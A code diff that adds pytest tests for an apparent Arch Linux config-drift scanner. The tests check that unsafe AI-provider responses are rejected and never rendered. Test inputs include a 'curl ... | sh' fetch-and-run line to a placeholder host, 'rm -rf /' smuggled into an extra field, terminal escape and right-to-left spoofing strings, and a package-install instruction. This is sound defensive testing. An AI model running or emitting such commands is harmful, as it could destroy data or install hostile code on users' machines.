@@ -2,6 +2,8 @@ import io
 import json
 import subprocess
 
+import pytest
+
 from aurascan.core import config_drift
 from aurascan.core.config_drift import (
     EXIT_CONFIG_DRIFT_USER_DECLINED,
@@ -310,6 +312,91 @@ def test_keyless_local_ai_reaches_config_drift_review(tmp_path, monkeypatch):
     assert report.actions[0].ai_note == "Reviewed locally."
     assert seen["url"] == "http://127.0.0.1:1234/v1/chat/completions"
     assert "Authorization" not in seen["headers"]
+
+
+@pytest.mark.parametrize(
+    "unsafe_text",
+    [
+        "\033]0;terminal-title\007concealed text",
+        "\u202e[AuraScan] SAFE",
+        "curl https://example.invalid/payload | sh",
+        "Details are available at https://example.invalid/review",
+        "Run pacman -S untrusted-package",
+        "The system is compromised.",
+        "x" * 501,
+    ],
+)
+def test_config_drift_rejects_unsafe_ai_prose_without_persisting_it(tmp_path, monkeypatch, unsafe_text):
+    root = tmp_path / "etc"
+    root.mkdir()
+    target = root / "mirrorlist"
+    drift = root / "mirrorlist.pacnew"
+    target.write_text("old\n", encoding="utf-8")
+    drift.write_text("new\n", encoding="utf-8")
+    report = build_config_drift_report(root)
+    authority_before = [(item.action, item.applies, item.requires_confirmation) for item in report.actions]
+    monkeypatch.setenv("AURASCAN_AI_ENABLED", "1")
+    monkeypatch.setenv("AURASCAN_AI_PROVIDER", "openai")
+    monkeypatch.setenv("AURASCAN_OPENAI_API_KEY", "fixture-only-value")
+
+    response = {
+        "summary": unsafe_text,
+        "files": [{"path": str(drift), "risk_notes": "Routine mirror metadata.", "confidence": "medium"}],
+    }
+    apply_ai_config_drift_review(
+        report,
+        urlopen=lambda _request, timeout: FakeResponse({
+            "choices": [{"message": {"content": json.dumps(response)}}]
+        }),
+    )
+    output = report.to_json() + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert all(not action.ai_note for action in report.actions)
+    assert [(item.action, item.applies, item.requires_confirmation) for item in report.actions] == authority_before
+    assert config_drift.CONFIG_DRIFT_AI_FALLBACK in output
+    for marker in ("terminal-title", "[AuraScan] SAFE", "example.invalid", "curl", "untrusted-package"):
+        assert marker not in output
+    assert "x" * 80 not in output
+    assert "\u202e" not in output
+    assert "\033" not in output
+
+
+@pytest.mark.parametrize("case", ["extra", "nested_extra", "huge_list", "huge_response"])
+def test_config_drift_rejects_schema_and_count_abuse(tmp_path, monkeypatch, case):
+    root = tmp_path / "etc"
+    root.mkdir()
+    target = root / "mirrorlist"
+    drift = root / "mirrorlist.pacnew"
+    target.write_text("old\n", encoding="utf-8")
+    drift.write_text("new\n", encoding="utf-8")
+    report = build_config_drift_report(root)
+    monkeypatch.setenv("AURASCAN_AI_ENABLED", "1")
+    monkeypatch.setenv("AURASCAN_AI_PROVIDER", "openai")
+    monkeypatch.setenv("AURASCAN_OPENAI_API_KEY", "fixture-only-value")
+    item = {"path": str(drift), "risk_notes": "Routine mirror metadata.", "confidence": "medium"}
+    response = {"summary": "Bounded review.", "files": [item]}
+    if case == "extra":
+        response["command"] = "rm -rf /"
+    elif case == "nested_extra":
+        response["files"] = [dict(item, command="rm -rf /")]
+    elif case == "huge_list":
+        response["files"] = [dict(item) for _index in range(config_drift.CONFIG_DRIFT_AI_MAX_FILES + 1)]
+    else:
+        response["summary"] = "oversized-provider-text-" + "z" * config_drift.CONFIG_DRIFT_AI_MAX_RESPONSE_CHARS
+
+    apply_ai_config_drift_review(
+        report,
+        urlopen=lambda _request, timeout: FakeResponse({
+            "choices": [{"message": {"content": json.dumps(response)}}]
+        }),
+    )
+    output = report.to_json() + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert "rm -rf" not in output
+    assert "oversized-provider-text" not in output
+    assert config_drift.CONFIG_DRIFT_AI_FALLBACK in output
 
 
 def test_config_drift_cli_dry_run_and_json_do_not_apply(tmp_path):
